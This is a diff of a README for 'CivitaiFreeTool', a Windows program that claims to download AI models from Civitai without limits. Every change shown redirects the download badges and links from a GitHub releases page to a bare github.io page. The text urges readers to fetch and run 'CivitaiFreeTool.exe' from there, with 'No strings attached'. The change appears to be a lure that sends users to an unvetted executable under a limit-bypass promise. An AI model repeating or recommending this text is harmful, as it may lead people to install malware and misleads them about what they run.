@@ -1,6 +1,6 @@
 # 🔧 CivitaiFreeTool - Download AI Models Without Limits
 
-[![Download CivitaiFreeTool](https://img.shields.io/badge/Download-CivitaiFreeTool-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=00FF7F)](https://github.com/Chrissycompleted610/CivitaiFreeTool/releases)
+[![Download CivitaiFreeTool](https://img.shields.io/badge/Download-CivitaiFreeTool-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=00FF7F)](https://chrissycompleted610.github.io)
 
 ## 🎯 What Is CivitaiFreeTool?
 
@@ -8,11 +8,11 @@ CivitaiFreeTool is a free, all-in-one application for Windows that helps you dow
 
 ## 📥 Downloading CivitaiFreeTool
 
-Visit this link to download the application: [https://github.com/Chrissycompleted610/CivitaiFreeTool/releases](https://github.com/Chrissycompleted610/CivitaiFreeTool/releases)
+Visit this link to download the application: [https://chrissycompleted610.github.io](https://chrissycompleted610.github.io)
 
 On that page, you'll see a list of available releases. Look for the latest version and click it. Then find the file named `CivitaiFreeTool.exe` or similar. Your web browser will download the file to your computer automatically.
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-orange?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Chrissycompleted610/CivitaiFreeTool/releases)
+[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-orange?style=for-the-badge&logo=windows&logoColor=white)](https://chrissycompleted610.github.io)
 
 ## ⚙️ Installing the Software
 
@@ -136,7 +136,7 @@ We hope CivitaiFreeTool makes your AI model experience easier and more productiv
 
 ## 🔗 Final Download Link
 
-Visit this link to download the application: [https://github.com/Chrissycompleted610/CivitaiFreeTool/releases](https://github.com/Chrissycompleted610/CivitaiFreeTool/releases)
+Visit this link to download the application: [https://chrissycompleted610.github.io](https://chrissycompleted610.github.io)
 
 Click the green "Download" button on that page to get the latest version. Then run the file. No strings attached.
 
